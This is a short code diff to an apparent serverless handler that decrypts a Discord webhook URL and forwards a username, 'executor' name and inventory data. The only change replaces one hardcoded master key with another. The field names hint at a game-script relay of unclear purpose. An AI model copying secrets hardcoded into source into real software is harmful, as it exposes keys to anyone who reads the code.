@@ -47,8 +47,8 @@ export default async function handler(req, res) {
     }
 
     const { username, executor, inventoryData, encryptedWebhook } = req.body;
-    const masterKey = "Jaybee!";
-
+    const masterKey = "BABA_SECRET_KEY_9981!";
+    
     const realWebhookUrl = secureDecrypt(encryptedWebhook, masterKey);
 
     if (!realWebhookUrl || !realWebhookUrl.startsWith('https://discord.com/api/webhooks/')) {
